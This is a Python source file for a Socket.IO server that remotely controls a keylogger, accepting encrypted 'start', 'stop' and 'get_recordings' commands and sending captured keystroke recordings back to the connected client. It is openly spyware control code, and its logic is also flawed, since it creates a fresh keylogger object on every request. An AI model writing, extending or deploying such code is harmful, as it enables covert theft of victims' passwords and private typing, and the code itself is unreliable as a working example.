import socketio
import json
from keylogger import Keylogger
import encryption
import authentication

sio = socketio.Server()
app = socketio.WSGIApp(sio)

@sio.event
def connect(sid, environ):
    print(f'Connected: {sid}')

@sio.event
def disconnect(sid):
    print(f'Disconnected: {sid}')

@sio.on('keylogger_data')
def handle_keylogger_data(sid, data):
    try:
        decrypted_data = encryption.decrypt(data['data'], data['key'])
        request = json.loads(decrypted_data)
        keylogger_instance = Keylogger()
        response = {}
        if request['action'] == 'start':
            keylogger_instance.start_logging()
            response['status'] = 'success'
        elif request['action'] == 'stop':
            keylogger_instance.stop_logging()
            response['status'] = 'success'
        elif request['action'] == 'get_recordings':
            recordings = keylogger_instance.get_recordings()
            response['recordings'] = recordings
            response['status'] = 'success'
        else:
            response['status'] = 'error'
        response_data = encryption.encrypt(json.dumps(response), data['key'])
        sio.emit('response', {'data': response_data}, room=sid)
    except Exception as e:
        print(f'Error handling client: {str(e)}')

if __name__ == '__main__':
    import eventlet
    import eventlet.wsgi
    import socketio

    eventlet.wsgi.server(eventlet.listen(('localhost', 12345)), app)
